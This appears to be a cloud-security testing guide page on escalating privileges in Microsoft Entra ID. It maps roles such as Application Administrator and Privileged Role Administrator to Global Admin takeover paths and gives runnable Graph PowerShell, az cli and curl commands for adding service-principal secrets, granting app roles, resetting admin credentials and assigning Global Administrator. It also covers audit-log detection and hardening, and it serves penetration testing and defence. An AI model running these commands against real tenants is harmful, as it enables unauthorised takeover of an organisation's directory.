---
cstg_id: CSTG-AZURE-ENTRA-ID-PRIVESC
title: "AZURE Entra Id - Privilege Escalation"
provider: azure
service: entra-id
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "A foothold principal holding one of the role/permission edges enumerated below (e.g. Application Administrator, Privileged Authentication Administrator, ownership of a privileged app/service principal, or a Graph app role such as RoleManagement.ReadWrite.Directory)"
tools: [Microsoft Graph PowerShell SDK, az cli, ROADtools (roadtx), AADInternals, AzureHound/BloodHound, MicroBurst]
references:
  - "https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference"
  - "https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/privileged-roles-permissions"
  - "https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword"
  - "https://learn.microsoft.com/en-us/graph/permissions-reference"
  - "https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5"
  - "https://github.com/dirkjanm/ROADtools"
  - "https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/security-planning"
license: CC BY-SA 4.0
---

## Summary

Privilege escalation in Entra ID is the process of leveraging a held role, permission, or ownership edge to acquire a more powerful identity — ultimately Global Administrator or an equivalent tenant-controlling position. Unlike resource-plane escalation, Entra ID escalation operates on the **directory graph**: control over an application, a service principal, a group, or a privileged-role-management permission can be parlayed into control over the entire tenant because these objects can grant themselves (or attacker-controlled principals) higher roles and Graph permissions.

The attacker objective is to convert a constrained foothold into directory dominance. This page maps each abusable permission/role to its concrete escalation path, in the OWASP per-permission format. The common theme: many roles short of Global Administrator can **reset credentials, add credentials, grant app roles, modify group membership, or assign directory roles** — and each of those is a one-step path to full control.

Enumeration of which of these edges the foothold holds is covered in [enumeration](../02-services/azure-entra-id-enum.md).

## Prerequisites

- An authenticated foothold principal (user, service principal, or managed identity) holding at least one of the edges below.
- A Microsoft Graph token with the foothold's effective permissions; ability to call Graph write APIs.
- Knowledge (from enumeration) of target high-value principals: existing Global Admins, privileged groups, and service principals with powerful Graph app roles.

## Enumeration

```powershell
# Determine the foothold's own roles, owned objects, and app-role assignments
Get-MgUserMemberOf -UserId (Get-MgContext).Account
Get-MgUserOwnedObject -UserId <id>            # owned apps/SPs/groups
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '<id>'"

# Identify service principals that hold high-value Graph app roles (escalation targets)
$graph = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $graph.Id |
  Where-Object { $_.AppRoleId -in @($roleManagementWrite,$appRoleAssignmentWrite,$directoryWrite) }
```

## Misconfigurations & Findings

- Roles below Global Administrator that can still manage credentials/roles/app permissions (Application Administrator, Cloud Application Administrator, Privileged Authentication Administrator, Authentication Administrator, User Administrator, Groups Administrator, Privileged Role Administrator, Hybrid Identity Administrator, Partner Tier-2 Support).
- **Ownership** edges (user owns a privileged app/SP/group) that allow credential or membership manipulation without any directory role.
- Service principals granted tenant-wide Graph **application permissions** that can self-escalate (`RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All`, `Application.ReadWrite.All`, `Directory.ReadWrite.All`).
- **Role-assignable groups** whose membership grants a directory role.

## Exploitation

### Application Administrator / Cloud Application Administrator

These roles can add credentials (passwords/certificates) to **any** application or service principal in the tenant. By adding a secret to a service principal that already holds a powerful Graph app role (e.g. `RoleManagement.ReadWrite.Directory`), then authenticating as that SP, the foothold inherits that permission and can grant itself Global Administrator.

```powershell
# Add a client secret to a target service principal that holds RoleManagement.ReadWrite.Directory
$cred = Add-MgServicePrincipalPassword -ServicePrincipalId <target-sp-id> `
  -PasswordCredential @{ displayName = "svc"; endDateTime = (Get-Date).AddYears(1) }
# Authenticate app-only as that SP, then escalate
az login --service-principal -u <appId> -p $cred.SecretText --tenant <tenant>
```

### Service principal with RoleManagement.ReadWrite.Directory

Any principal able to act as this SP can assign directory roles directly. Add the foothold (or a controlled SP) to Global Administrator.

```bash
# Activate the Global Administrator directory role template then add a member
curl -s -X POST -H "Authorization: Bearer $SP_TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  -d '{"principalId":"<attacker-id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/"}'
```

### Service principal with AppRoleAssignment.ReadWrite.All

This permission lets a principal grant **any** app role (including `RoleManagement.ReadWrite.Directory`) to itself, then use the new permission to assign roles. It is a two-step path to Global Admin and is frequently overlooked because it sounds benign.

```powershell
# Grant RoleManagement.ReadWrite.Directory to our own SP, then assign GA as above
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId <our-sp-id> `
  -PrincipalId <our-sp-id> -ResourceId <graph-sp-id> -AppRoleId <roleManagementWrite-appRoleId>
```

### Privileged Authentication Administrator / Authentication Administrator

Can reset authentication methods (including MFA) and passwords for users. Privileged Authentication Administrator can do so for **any** user including Global Admins; Authentication Administrator for non-admins. Reset a Global Admin's credentials/MFA and sign in as them.

```powershell
# Reset a target's password (then satisfy MFA via reset auth methods)
Reset-MgUserAuthenticationMethodPassword -UserId <ga-user-id> -NewPassword '<new>'
```

### User Administrator

Can reset passwords for non-administrative users and members of limited roles, and manage group membership. Combined with a helpdesk/non-admin account that is an **owner** of a privileged group, or by resetting a user who is a member of a powerful role, this yields escalation.

```powershell
Update-MgUserPassword # via authentication methods; reset target non-admin then leverage their access
```

### Groups Administrator / group ownership

Adding the foothold to a **role-assignable group** that confers a directory role grants that role transitively.

```powershell
New-MgGroupMember -GroupId <role-assignable-group-id> -DirectoryObjectId <attacker-id>
```

### Privileged Role Administrator

Can manage **all** role assignments and PIM settings — directly assign Global Administrator to any principal, or modify PIM eligibility/approval to grant standing access. This is effectively equivalent to Global Admin.

```powershell
New-MgRoleManagementDirectoryRoleAssignment -RoleDefinitionId <GA-template> -PrincipalId <attacker> -DirectoryScopeId "/"
```

### Hybrid Identity Administrator

Controls directory synchronization configuration; can manipulate Pass-Through Authentication / Seamless SSO and federation settings, enabling on-prem-to-cloud and federation-trust escalation paths (overlaps with [persistence](../06-persistence/azure-entra-id-persistence.md)).

### Application ownership (no directory role)

A user who **owns** an application or service principal can add credentials to it even without Application Administrator. If that owned SP holds powerful Graph app roles, ownership alone is a Global-Admin path via the credential-addition technique above.

```powershell
# Owner adds a certificate/secret to the owned SP, then authenticates as it
Add-MgServicePrincipalPassword -ServicePrincipalId <owned-sp-id> -PasswordCredential @{displayName="o"; endDateTime=(Get-Date).AddMonths(6)}
```

## Detection & Logging

- **Entra ID audit logs** record the escalation actions explicitly: `Add member to role` / `Add eligible member to role` (directory role assignment), `Add service principal credentials` and `Update application – Certificates and secrets management` (credential addition), `Add app role assignment to service principal` / `Add delegated permission grant` (Graph permission grant), `Reset password (by admin)` and `Update user (auth methods)` (credential/MFA reset), and `Add member to group`.
- Correlate a credential addition to a service principal followed shortly by an **app-only sign-in** of that SP from a new IP in **sign-in logs (service principal sign-ins)**.
- New Global Administrator assignments and changes to PIM configuration should be high-severity alerts.
- **Entra ID Protection** and **Microsoft Defender for Cloud Apps** can flag anomalous admin activity and "suspicious addition of credentials to an OAuth app".
- Azure **Activity Logs** capture downstream ARM actions if the escalated identity then touches subscriptions.

## Remediation & Hardening

- Treat Application Administrator, Cloud Application Administrator, Privileged Authentication Administrator, Privileged Role Administrator, User Administrator, and Hybrid Identity Administrator as **Tier-0 / Global-Admin-equivalent** and manage them with PIM (eligible, approval-gated, time-bound).
- Inventory and remove unnecessary **Graph application permissions** on service principals, especially `RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All`, `Application.ReadWrite.All`, and `Directory.ReadWrite.All`.
- Restrict and review **application/service-principal ownership**; avoid granting ownership of privileged apps to non-Tier-0 users.
- Enforce **MFA and Conditional Access** on all privileged roles and require phishing-resistant authentication for admins.
- Alert on **credential additions to service principals/apps**, new directory-role assignments, and admin password/MFA resets.
- Use **role-assignable groups** sparingly and protect their owners/membership; enable "restricted management" where appropriate.
- Apply Microsoft's **securing privileged access** model and run regular access reviews.

## Tools

- **Microsoft Graph PowerShell SDK** — credential, role, and app-role assignment cmdlets.
- **az cli** — service-principal authentication after credential injection.
- **ROADtools (roadtx)** — token manipulation and app-only authentication for SP abuse.
- **AADInternals** — directory-role and credential manipulation helpers.
- **AzureHound/BloodHound** — pre-attack pathfinding to identify the shortest escalation chain.
- **MicroBurst** — Azure/Entra escalation and enumeration scripts.

## References

- Microsoft Entra built-in roles and least-privileged roles reference
- Privileged roles and permissions documentation
- Microsoft Graph `servicePrincipal: addPassword` API
- Microsoft Graph permissions reference
- SpecterOps — Azure privilege escalation via service principal abuse
- Microsoft — securing privileged access / security planning
- ROADtools project documentation
